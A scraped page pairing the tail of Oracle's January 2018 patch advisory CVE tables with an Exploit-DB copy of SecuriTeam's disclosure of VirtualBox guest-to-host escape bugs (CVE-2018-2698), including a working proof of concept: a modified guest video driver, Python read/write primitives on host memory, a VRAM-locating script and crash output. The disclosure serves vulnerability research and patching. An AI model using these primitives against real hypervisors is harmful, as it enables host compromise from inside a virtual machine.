| CVE-2017-5645 | Oracle Agile PLM MCAD Connector | CAX Client (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 3.3, 3.4, 3.5, 3.6 |  |
| CVE-2017-5645 | Oracle Autovue for Agile Product Lifecycle Management | Internal Operations (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 21.0.0, 21.0.1 |  |
| CVE-2017-5645 | Oracle Transportation Management | Business Process Automation (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.2.11, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5, 6.3.6, 6.3.7, 6.4.1 |  |
| CVE-2017-5645 | Oracle Transportation Management | Importing and Exporting Data (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.3.3, 6.3.4, 6.3.5, 6.3.6, 6.3.7, 6.4.1, 6.4.2 |  |
| CVE-2017-12617 | Oracle Agile PLM | Folders, Files & Attachments (Apache Tomcat) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 9.3.3, 9.3.4, 9.3.5, 9.3.6 |  |
| CVE-2017-12617 | Oracle Transportation Management | Install (Apache Tomcat) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5, 6.3.6, 6.3.7 |  |
| CVE-2017-5664 | Oracle Agile Engineering Data Management | Install (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 6.1.3, 6.2.0, 6.2.1 |  |
| CVE-2017-5664 | Oracle Agile PLM | Folders, Files & Attachments (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 9.3.5, 9.3.6 |  |
| CVE-2018-2609 | Oracle Agile PLM | Security | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 9.3.5, 9.3.6 |  |
| CVE-2018-2662 | Oracle Transportation Management | Security | HTTP | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 6.2.11, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5, 6.3.6, 6.3.7, 6.4.1 |  |
| CVE-2018-2631 | Oracle Transportation Management | Security | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | Low | None | None | 6.2.11, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5, 6.3.6, 6.3.7, 6.4.1, 6.4.2, 6.4.3 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-5664 also addresses CVE-2016-8735.

### Oracle Support Tools Risk Matrix

This Critical Patch Update contains 3 new security fixes for Oracle Support Tools. 1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#TOOL).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2615 | OSS Support Tools | Diagnostic Assistant | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | Prior to 2.11.33 |  |
| CVE-2018-2616 | OSS Support Tools | Diagnostic Assistant | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | Prior to 2.11.33 |  |
| CVE-2018-2617 | OSS Support Tools | Diagnostic Assistant | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Prior to 2.11.33 |  |

### Oracle Virtualization Risk Matrix

This Critical Patch Update contains 14 new security fixes for Oracle Virtualization. 3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#OVIR).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-5645 | Oracle Secure Global Desktop (SGD) | Core (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 5.3 |  |
| CVE-2018-2694 | Oracle VM VirtualBox | Core | None | No | 8.8 | Local | Low | Low | None | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2698 | Oracle VM VirtualBox | Core | None | No | 8.8 | Local | Low | Low | None | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2685 | Oracle VM VirtualBox | Core | None | No | 8.6 | Local | Low | None | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2686 | Oracle VM VirtualBox | Core | None | No | 8.6 | Local | Low | None | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2687 | Oracle VM VirtualBox | Core | None | No | 8.6 | Local | Low | None | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2688 | Oracle VM VirtualBox | Core | None | No | 8.6 | Local | Low | None | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2689 | Oracle VM VirtualBox | Core | None | No | 8.6 | Local | Low | None | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2690 | Oracle VM VirtualBox | Core | None | No | 8.6 | Local | Low | None | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2676 | Oracle VM VirtualBox | Core | None | No | 8.2 | Local | Low | High | None | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2018-2693 | Oracle VM VirtualBox | Guest Additions | None | No | 8.2 | Local | Low | Low | Required | Changed | High | High | High | Prior to 5.1.32, Prior to 5.2.6 |  |
| CVE-2017-3736 | Oracle Secure Global Desktop (SGD) | Core (OpenSSL) | TLS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 5.3 |  |
| CVE-2017-3736 | Oracle VM VirtualBox | Core (OpenSSL) | TLS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | Prior to 5.1.32, Prior to 5.2.4 |  |
| CVE-2017-5715 | Oracle VM VirtualBox | Core | None | No | 5.6 | Local | High | Low | None | Changed | High | None | None | Prior to 5.1.32, Prior to 5.2.6 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-3736 also addresses CVE-2017-3735.

Resources for

* [Careers](/careers/)
* [Developers](/developer/)
* [Investors](https://investor.oracle.com/home/default.aspx)
* [Partners](/partner/)
* [Researchers](/research/)
* [Students and Educators](https://academy.oracle.com/en/oa-web-overview.html)

Why Oracle

* [Analyst Reports](/corporate/analyst-reports/)
* [Best cloud-based
  ERP](/erp/what-is-erp/best-erp/)
* [Cloud Economics](/cloud/economics/)
* [Social Impact](/social-impact/)
* [Culture and Inclusion](/careers/diversity-inclusion/)
* [Security Practices](/corporate/security-practices/)

Learn

* [What is cloud
  computing?](/cloud/what-is-cloud-computing/)
* [What is CRM?](/cx/what-is-crm/)
* [What is
  Docker?](/cloud/cloud-native/container-registry/what-is-docker/)
* [What is
  Kubernetes?](/cloud/cloud-native/kubernetes-engine/what-is-kubernetes/)
* [What is
  Python?](/developer/what-is-python-for-developers/)
* [What is SaaS?](/applications/what-is-saas/)

News and Events

* [News](/news/)
* [Oracle CloudWorld](/cloudworld/)
* [Oracle CloudWorld Tour](/cloudworld-tour/)
* [Oracle Health Summit](/health/health-summit/)
* [Oracle Dev Tour](/developer/dev-tour/)
* [Search all events](https://search.oracle.com/events?q=&lang=english)

Contact Us

* US Sales: +1.800.633.0738
* [How can we help?](/corporate/contact/)
* [Subscribe to emails](https://go.oracle.com/subscribe/?l_code=en&src1=OW:O:FO)
* [Integrity Helpline](https://secure.ethicspoint.com/domain/media/en/gui/31053/index.html)
* [Accessibility](/corporate/accessibility/)

---

* [Country/Region](/universal-menu/#u10countrymenu)

* [© 2025 Oracle](/legal/copyright/)
* [Privacy](/legal/privacy/)/[Do Not Sell My
  Info](/legal/privacy/privacy-choices/)
* [Ad
  Choices](/legal/privacy/privacy-policy/#adchoices)
* [Careers](/corporate/careers/)



=== Content from www.exploit-db.com_24d5efb6_20250111_113009.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Oracle VirtualBox < 5.1.30 / < 5.2-rc1 - Guest to Host Escape

#### EDB-ID:

###### 43878

#### CVE:

###### [2018-2698](https://nvd.nist.gov/vuln/detail/CVE-2018-2698)

---

**EDB Verified:**

#### Author:

###### [SecuriTeam](/?author=4206)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2018-01-24

---

**Vulnerable App:**

```
# SSD Advisory – Oracle VirtualBox Multiple Guest to Host Escape Vulnerabilities
Source: https://blogs.securiteam.com/index.php/archives/3649

## Vulnerabilities summary
The following advisory describes two (2) guest to host escape found in Oracle VirtualBox version 5.1.30, and VirtualBox version 5.2-rc1.

## Credit
An independent security researcher, Niklas Baumstark, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

## Vendor response
Oracle were informed of the vulnerabilities and released patches to address them.

For more details: http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html

CVE: CVE-2018-2698

## Vulnerabilities details
The vulnerabilities found in the core graphics framework (VBVA subcomponent) and affect all host operating systems.

provide an arbitrary read/write primitive in the userland VirtualBox host rocess, relative to the guest’s VRAM buffer.

The VGA device emulated by VirtualBox is associated with a certain amount of VRAM, which is mapped contiguously in both the host process running the VM and in guest kernel memory.

Parts of it are used as general-purpose shared memory segment for communication between the host and guest (host-guest shared memory interface, HGSMI).

Using this mechanism, the guest can issue certain commands to the host, for example to implement the mouse pointer integration and seamless windows features.

The guest can also tell the host to copy data around inside the VRAM on its behalf, via a subsystem called VDMA.

## Out-of-bounds read/write in vboxVDMACmdExecBpbTransfer
The VBOXVDMACMD_DMA_BPB_TRANSFER command struct looks as follows (defined in include/VBox/VBoxVideo.h:1435):

```
    typedef struct VBOXVDMACMD_DMA_BPB_TRANSFER
    {
        uint32_t cbTransferSize;
        uint32_t fFlags;
        union
        {
            uint64_t phBuf;
            VBOXVIDEOOFFSET offVramBuf;
        } Src;
        union
        {
            uint64_t phBuf;
            VBOXVIDEOOFFSET offVramBuf;
        } Dst;
    } VBOXVDMACMD_DMA_BPB_TRANSFER, *PVBOXVDMACMD_DMA_BPB_TRANSFER;
```

When issuing a VDMA command of type VBOXVDMACMD_TYPE_DMA_BPB_TRANSFER, a request object of this type resides in the HGSMI heap and is completely controlled by the guest.

On the host, a pointer to the object is eventually passed to the following function inside the file src/VBox/Devices/Graphics/DevVGA_VDMA.cpp:

```
    static int vboxVDMACmdExecBpbTransfer(PVBOXVDMAHOST pVdma, const PVBOXVDMACMD_DMA_BPB_TRANSFER pTransfer, uint32_t cbBuffer)
    {
        // ...
        uint32_t cbTransfer = pTransfer->cbTransferSize;
        uint32_t cbTransfered = 0;
        // ...
        do
        {
            uint32_t cbSubTransfer = cbTransfer;
            if (pTransfer->fFlags & VBOXVDMACMD_DMA_BPB_TRANSFER_F_SRC_VRAMOFFSET)
            {
                // [[ Note 1 ]]
                pvSrc  = pvRam + pTransfer->Src.offVramBuf + cbTransfered;
            }
            else
            {
                // ...
            }

            if (pTransfer->fFlags & VBOXVDMACMD_DMA_BPB_TRANSFER_F_DST_VRAMOFFSET)
            {
                // [[ Note 2 ]]
                pvDst  = pvRam + pTransfer->Dst.offVramBuf + cbTransfered;
            }
            else
            {
                // ...
            }

            if (RT_SUCCESS(rc))
            {
                memcpy(pvDst, pvSrc, cbSubTransfer);
                cbTransfer -= cbSubTransfer;
                cbTransfered += cbSubTransfer;
            }
            else
            {
                cbTransfer = 0; /* to break */
            }
            // ...
        } while (cbTransfer);

        if (RT_SUCCESS(rc))
            return sizeof (*pTransfer);
        return rc;
    }
```

Note 1 and 2: the guest-controlled offsets pTransfer->Src.offVramBuf and pTransfer->Dst.offVramBuf are added to the VRAM address, without any verification or bounds checks.

A memcpy is then performed with the guest-controlled size pTransfer->cbTransferSize.

This gives us a memcpy(VRAM + X, VRAM + Y, Z) primitive, where we (as the guest)can chose X, Y and Z arbitrarily.

## Out-of-bounds read/write in vboxVDMACmdExecBlt

The VBOXVDMACMD_DMA_PRESENT_BLT command struct looks as follows:

```
    typedef uint64_t VBOXVIDEOOFFSET;
    /* [...] */
    typedef struct VBOXVDMACMD_DMA_PRESENT_BLT
    {
        VBOXVIDEOOFFSET offSrc;
        VBOXVIDEOOFFSET offDst;
        VBOXVDMA_SURF_DESC srcDesc;
        VBOXVDMA_SURF_DESC dstDesc;
        VBOXVDMA_RECTL srcRectl;
        VBOXVDMA_RECTL dstRectl;
        uint32_t u32Reserved;
        uint32_t cDstSubRects;
        VBOXVDMA_RECTL aDstSubRects[1];
    } VBOXVDMACMD_DMA_PRESENT_BLT, *PVBOXVDMACMD_DMA_PRESENT_BLT;
```

When issuing a VDMA command of type VBOXVDMACMD_TYPE_DMA_PRESENT_BLT, a request object of this type resides in the HGSMI heap and is completely controlled by the guest.

On the host, a pointer to the object is eventually passed to the following function inside the file src/VBox/Devices/Graphics/DevVGA_VDMA.cpp:

```
    static int vboxVDMACmdExecBlt(PVBOXVDMAHOST pVdma, const PVBOXVDMACMD_DMA_PRESENT_BLT pBlt, uint32_t cbBuffer)
    {
        const uint32_t cbBlt = VBOXVDMACMD_BODY_FIELD_OFFSET(uint32_t, VBOXVDMACMD_DMA_PRESENT_BLT, aDstSubRects[pBlt->cDstSubRects]);
        Assert(cbBlt <= cbBuffer);
        if (cbBuffer < cbBlt)
            return VERR_INVALID_FUNCTION;

        /* we do not support stretching for now */
        Assert(pBlt->srcRectl.width == pBlt->dstRectl.width);
        Assert(pBlt->srcRectl.height == pBlt->dstRectl.height);
        if (pBlt->srcRectl.width != pBlt->dstRectl.width)
            return VERR_INVALID_FUNCTION;
        if (pBlt->srcRectl.height != pBlt->dstRectl.height)
            return VERR_INVALID_FUNCTION;
        Assert(pBlt->cDstSubRects);  /* [[ Note 2 ]] */

        uint8_t * pvRam = pVdma->pVGAState->vram_ptrR3;
        VBOXVDMA_RECTL updateRectl = {0, 0, 0, 0};

        if (pBlt->cDstSubRects)
        {
            /* [...] */
        }
        else
        {
            /* [[ Note 1 ]] */
            int rc = vboxVDMACmdExecBltPerform(pVdma, pvRam + pBlt->offDst, pvRam + pBlt->offSrc,
                    &pBlt->dstDesc, &pBlt->srcDesc,
                    &pBlt->dstRectl,
                    &pBlt->srcRectl);
            AssertRC(rc);
            if (!RT_SUCCESS(rc))
                return rc;

            vboxVDMARectlUnite(&updateRectl, &pBlt->dstRectl);
        }

        return cbBlt;
    }
```

At Note 1, the guest-controlled offsets pBlt->offDst and pBlt->offSrc I added to the VRAM address, without any verification. Note that the assert at Note 2 is not active in production builds, so we can reach the else-branch.

vboxVDMACmdExecBltPerform then performs a memcpy between the computed addresses:

```
    static int vboxVDMACmdExecBltPerform(PVBOXVDMAHOST pVdma, uint8_t *pvDstSurf, const uint8_t *pvSrcSurf,
                                        const PVBOXVDMA_SURF_DESC pDstDesc, const PVBOXVDMA_SURF_DESC pSrcDesc,
                                        const VBOXVDMA_RECTL * pDstRectl, const VBOXVDMA_RECTL * pSrcRectl)
    {
        /* [...] /*
        if (pDstDesc->width == pDstRectl->width
                && pSrcDesc->width == pSrcRectl->width
                && pSrcDesc->width == pDstDesc->width)
        {
            Assert(!pDstRectl->left);
            Assert(!pSrcRectl->left);
            uint32_t cbOff = pDstDesc->pitch * pDstRectl->top;
            uint32_t cbSize = pDstDesc->pitch * pDstRectl->height;
            memcpy(pvDstSurf + cbOff, pvSrcSurf + cbOff, cbSize);
        }
        else
        {
            /* [...] /*
        }
        return VINF_SUCCESS;
    }
```

By setting pDstDesc->pitch = 1, pDstRectl->top = 0, we can get cbOff = 0 and cbSize = pDstRectl->height (which we also control as the guest).

This ends up in a call to memcpy(VRAM + X, VRAM + Y, Z), where we can chose X, Y and Z arbitrarily.

## Proof of Concept

We will modified vboxvideo kernel module to trigger the bug.

The modified module will allow us to creates a device /dev/vboxpwn which can be used to send arbitrary VBVA commands via its ioctl() handler.

In this PoC we will use 64-bit Ubuntu VM.

First we will download the VBoxGuestAdditions:

```
    $ wget http://download.virtualbox.org/virtualbox/5.1.30/VBoxGuestAdditions_5.1.30.iso
    $ sudo mount -o loop -t iso9660 VBoxGuestAdditions_5.1.30.iso /mnt
    $ sudo /mnt/VBoxLinuxAdditions.run
```

Then we will upload the modified files – HGSMIBase.c and 70-vboxpwn.rules to the home directory of the VM and rebuild the extensions with the modified code:

```
    $ sudo cp 70-vboxpwn.rules /etc/udev/rules.d
    $ sudo cp HGSMIBase.c /usr/src/vboxguest-5.1.30/vboxvideo
    $ sudo /mnt/VBoxLinuxAdditions.run --keep --target additions --noexec
    $ sudo additions/vboxadd setup
    $ sudo reboot
```

There should now be a new device called /dev/vboxpwn with 0666 permissions.

Now create the following Python script called poc.py:

```
    import os, fcntl, struct, array, sys

    fd = os.open('/dev/vboxpwn', os.O_NONBLOCK | os.O_RDWR)

    # 4/5 = BPB_TRANSFER primitive, 1/2 = PRESENT_BLT primitive
    read_type = 4
    write_type = 5

    def read(offset, size):
        data = ''
        data += struct.pack("<IIq", 4, size, offset)
        data += '\0'*size
        data = array.array('b', data)
        fcntl.ioctl(fd, len(data), data, 1)
        return data[16:]

    def write(offset, payload):
        data = ''
        data += struct.pack("<IIq", 5, len(payload), offset)
        data += payload
        fcntl.ioctl(fd, len(data), data)

    def get_vram_size():
        data = ''
        data += struct.pack("<IIq", 6, 0, 0)
        data += '\0'*4
        data = array.array('b', data)
        fcntl.ioctl(fd, len(data), data)
        return struct.unpack('<I', data[16:])[0]

    vram_sz = get_vram_size()

    import code
    code.interact(local=locals())
```

If we will run it on a Linux host we will get the following:

```
    $ python2 poc.py
    [...]
    >>> read(0, 0x10).tostring()
    'U,\\fU,\\fU,\\fU,\\f'
    >>> read(vram_sz, 0x10).tostring()
    '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    >>> read(-0x1000, 0x10).tostring()
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

The second read returns the header of the shared library mapped directly after the VRAM.

Of course we might crash the VM if we hit unmapped memory.

For demonstrating an absolute read/write, we need the VRAM base address on the host.

The findvram.py script find the VRAM base address – given the configured VRAM size.

In our case the VRAM is 33 MiB large.

The first argument is the PID of the host process (as shown above).

Also grab some absolute address you want to leak:

```
    $ sudo python2 findvram.py 23791 33
    VRAM @ 0x00007f1651c75000
    $ sudo cat /proc/23791/maps | grep libcurl | head -n 1
    7f168969c000-7f1689716000 r-xp 00000000 00:15 9032634                    /usr/lib/libcurl.so.4.4.0
```

Back to the VM, we will read the ELF header of this library:

```
 $ python2 poc.py
    [...]
    >>> vram = 0x00007f1651c75000
    >>> read(0x7f168969c000 - vram, 0x10).tostring()
    '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

And now we will crash it by writing data to an unmapped address (make sure a debugger is attached):

```
>>> write(0x414141414141 - vram, 'BBBB')
```

The crash:

```
    Thread 7 "EMT" received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 0x7f1680b8e700 (LWP 23801)]
    0x00007f168a87172a in __memmove_avx_unaligned_erms () from /usr/lib/libc.so.6
    (gdb) x/1i $rip
    => 0x7f168a87172a <__memmove_avx_unaligned_erms+154>:   mov    %ecx,-0x4(%rdi,%rdx,1)
    (gdb) i r ecx rdi rdx
    ecx            0x42424242   1111638594
    rdi            0x414141414141   71748523475265
    rdx            0x4  4
```

findvram.py

```
import sys

if len(sys.argv) != 3:
    print 'Usage: sudo python2 findvram.py <pid> <VRAM size in MB>'
    print
    print 'Finds the VRAM page on a Linux host by inspecting /proc/<pid>/maps and '
    print 'looking for a properly sized map. Works best if an odd amount of VRAM is'
    print 'configured, like 33 MB instead of 32.'
    exit()

pid = int(sys.argv[1])
sz = int(sys.argv[2])*1024*1024

with open('/proc/%d/maps'%pid) as f:
    for line in f:
        start, end = [int(x,16) for x in line.split()[0].split('-')]
        if end-start == sz:
            print 'VRAM @ 0x%016x - 0x%016x' % (start, end)
```

70-vboxpwn.rules

```
KERNEL=="vboxpwn", NAME="vboxpwn", OWNER="vboxadd", MODE="0666"
```

HGSMIBase.c

```
/* $Id: HGSMIBase.cpp $ */
/** @file
 * VirtualBox Video driver, common code - HGSMI initialisation and helper
 * functions.
 */

/*
 * Copyright (C) 2006-2016 Oracle Corporation
 *
 * This file is part of VirtualBox Open Source Edition (OSE), as
 * available from http://www.virtualbox.org. This file is free software;
 * you can redistribute it and/or modify it under the terms of the GNU
 * General Public License (GPL) as published by the Free Software
 * Foundation, in version 2 as it comes in the "COPYING" file of the
 * VirtualBox OSE distribution. VirtualBox OSE is distributed in the
 * hope that it will be useful, but WITHOUT ANY WARRANTY of any kind.
 */

#include <VBox/VBoxVideoGuest.h>
#include <VBox/VBoxVideo.h>
#include <VBox/VBoxGuest.h>
#include <VBox/Hardware/VBoxVideoVBE.h>
#include <VBox/VMMDev.h>

#include <iprt/asm.h>
#include <iprt/log.h>
#include <iprt/string.h>

#include <linux/printk.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

/** Send completion notification to the host for the command located at offset
 * @a offt into the host command buffer. */
static void HGSMINotifyHostCmdComplete(PHGSMIHOSTCOMMANDCONTEXT pCtx, HGSMIOFFSET offt)
{
    VBoxVideoCmnPortWriteUlong(pCtx->port, offt);
}

/**
 * Inform the host that a command has been handled.
 *
 * @param  pCtx   the context containing the heap to be used
 * @param  pvMem  pointer into the heap as mapped in @a pCtx to the command to
 *                be completed
 */
DECLHIDDEN(void) VBoxHGSMIHostCmdComplete(PHGSMIHOSTCOMMANDCONTEXT pCtx,
                                          void *pvMem)
{
    HGSMIBUFFERHEADER *pHdr = HGSMIBufferHeaderFromData(pvMem);
    HGSMIOFFSET offMem = HGSMIPointerToOffset(&pCtx->areaCtx, pHdr);
    Assert(offMem != HGSMIOFFSET_VOID);
    if(offMem != HGSMIOFFSET_VOID)
    {
        HGSMINotifyHostCmdComplete(pCtx, offMem);
    }
}

/** Submit an incoming host command to the appropriate handler. */
static void hgsmiHostCmdProcess(PHGSMIHOSTCOMMANDCONTEXT pCtx,
                                HGSMIOFFSET offBuffer)
{
    int rc = HGSMIBufferProcess(&pCtx->areaCtx, &pCtx->channels, offBuffer);
    Assert(!RT_FAILURE(rc));
    if(RT_FAILURE(rc))
    {
        /* failure means the command was not submitted to the handler for some reason
         * it's our responsibility to notify its completion in this case */
        HGSMINotifyHostCmdComplete(pCtx, offBuffer);
    }
    /* if the cmd succeeded it's responsibility of the callback to complete it */
}

/** Get the next command from the host. */
static HGSMIOFFSET hgsmiGetHostBuffer(PHGSMIHOSTCOMMANDCONTEXT pCtx)
{
    return VBoxVideoCmnPortReadUlong(pCtx->port);
}

/** Get and handle the next command from the host. */
static void hgsmiHostCommandQueryProcess(PHGSMIHOSTCOMMANDCONTEXT pCtx)
{
    HGSMIOFFSET offset = hgsmiGetHostBuffer(pCtx);
    AssertReturnVoid(offset != HGSMIOFFSET_VOID);
    hgsmiHostCmdProcess(pCtx, offset);
}

/** Drain the host command queue. */
DECLHIDDEN(void) VBoxHGSMIProcessHostQueue(PHGSMIHOSTCOMMANDCONTEXT pCtx)
{
    while (pCtx->pfHostFlags->u32HostFlags & HGSMIHOSTFLAGS_COMMANDS_PENDING)
    {
        if (!ASMAtomicCmpXchgBool(&pCtx->fHostCmdProcessing, true, false))
            return;
        hgsmiHostCommandQueryProcess(pCtx);
        ASMAtomicWriteBool(&pCtx->fHostCmdProcessing, false);
    }
}

/** Detect whether HGSMI is supported by the host. */
DECLHIDDEN(bool) VBoxHGSMIIsSupported(void)
{
    uint16_t DispiId;

    VBoxVideoCmnPortWriteUshort(VBE_DISPI_IOPORT_INDEX, VBE_DISPI_INDEX_ID);
    VBoxVideoCmnPortWriteUshort(VBE_DISPI_IOPORT_DATA, VBE_DISPI_ID_HGSMI);

    DispiId = VBoxVideoCmnPortReadUshort(VBE_DISPI_IOPORT_DATA);

    return (DispiId == VBE_DISPI_ID_HGSMI);
}

/**
 * Allocate and initialise a command descriptor in the guest heap for a
 * guest-to-host command.
 *
 * @returns  pointer to the descriptor's command data buffer
 * @param  pCtx     the context containing the heap to be used
 * @param  cbData   the size of the command data to go into the descriptor
 * @param  u8Ch     the HGSMI channel to be used, set to the descriptor
 * @param  u16Op    the HGSMI command to be sent, set to the descriptor
 */
DECLHIDDEN(void *) VBoxHGSMIBufferAlloc(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                        HGSMISIZE cbData,
                                        uint8_t u8Ch,
                                        uint16_t u16Op)
{
#ifdef VBOX_WDDM_MINIPORT
    return VBoxSHGSMIHeapAlloc (&pCtx->heapCtx, cbData, u8Ch, u16Op);
#else
    return HGSMIHeapAlloc (&pCtx->heapCtx, cbData, u8Ch, u16Op);
#endif
}

/**
 * Free a descriptor allocated by @a VBoxHGSMIBufferAlloc.
 *
 * @param  pCtx      the context containing the heap used
 * @param  pvBuffer  the pointer returned by @a VBoxHGSMIBufferAlloc
 */
DECLHIDDEN(void) VBoxHGSMIBufferFree(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                     void *pvBuffer)
{
#ifdef VBOX_WDDM_MINIPORT
    VBoxSHGSMIHeapFree (&pCtx->heapCtx, pvBuffer);
#else
    HGSMIHeapFree (&pCtx->heapCtx, pvBuffer);
#endif
}

/**
 * Submit a command descriptor allocated by @a VBoxHGSMIBufferAlloc.
 *
 * @param  pCtx      the context containing the heap used
 * @param  pvBuffer  the pointer returned by @a VBoxHGSMIBufferAlloc
 */
DECLHIDDEN(int) VBoxHGSMIBufferSubmit(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                      void *pvBuffer)
{
    /* Initialize the buffer and get the offset for port IO. */
    HGSMIOFFSET offBuffer = HGSMIHeapBufferOffset (HGSMIGUESTCMDHEAP_GET(&pCtx->heapCtx), pvBuffer);

    Assert(offBuffer != HGSMIOFFSET_VOID);
    if (offBuffer != HGSMIOFFSET_VOID)
    {
        /* Submit the buffer to the host. */
        VBoxVideoCmnPortWriteUlong(pCtx->port, offBuffer);
        /* Make the compiler aware that the host has changed memory. */
        ASMCompilerBarrier();
        return VINF_SUCCESS;
    }

    return VERR_INVALID_PARAMETER;
}

/** Inform the host of the location of the host flags in VRAM via an HGSMI
 * command. */
static int vboxHGSMIReportFlagsLocation(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                        HGSMIOFFSET offLocation)
{
    HGSMIBUFFERLOCATION *p;
    int rc = VINF_SUCCESS;

    /* Allocate the IO buffer. */
    p = (HGSMIBUFFERLOCATION *)VBoxHGSMIBufferAlloc(pCtx,
                                              sizeof(HGSMIBUFFERLOCATION),
                                              HGSMI_CH_HGSMI,
                                              HGSMI_CC_HOST_FLAGS_LOCATION);
    if (p)
    {
        /* Prepare data to be sent to the host. */
        p->offLocation = offLocation;
        p->cbLocation  = sizeof(HGSMIHOSTFLAGS);
        rc = VBoxHGSMIBufferSubmit(pCtx, p);
        /* Free the IO buffer. */
        VBoxHGSMIBufferFree(pCtx, p);
    }
    else
        rc = VERR_NO_MEMORY;
    return rc;
}

/**
 * Inform the host of the location of the host flags in VRAM via an HGSMI
 * command.
 * @returns  IPRT status value.
 * @returns  VERR_NOT_IMPLEMENTED  if the host does not support the command.
 * @returns  VERR_NO_MEMORY        if a heap allocation fails.
 * @param    pCtx                  the context of the guest heap to use.
 * @param    offLocation           the offset chosen for the flags withing guest
 *                                 VRAM.
 */
DECLHIDDEN(int) VBoxHGSMIReportFlagsLocation(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                             HGSMIOFFSET offLocation)
{
    return vboxHGSMIReportFlagsLocation(pCtx, offLocation);
}

/** Notify the host of HGSMI-related guest capabilities via an HGSMI command.
 */
static int vboxHGSMISendCapsInfo(PHGSMIGUESTCOMMANDCONTEXT pCtx,
                                 uint32_t fCaps)
{
    VBVACAPS *pCaps;
    int rc = VINF_SUCCESS;

    /* Allocate the IO buffer. */
    pCaps = (VBVACAPS *)VBoxHGSMIBufferAlloc(pCtx,
                                       sizeof(VBVACAPS), HGSMI_CH_VBVA,
                                       VBVA_INFO_CAPS);

    if (pCaps)
    {
        /* Prepare data to be sent to the host. */
        pCaps->rc    = VERR_NOT_IMPLEMENTED;
        pCaps->fCaps = fCaps;
        rc = VBoxHGSMIBufferSubmit(pCtx, pCaps);
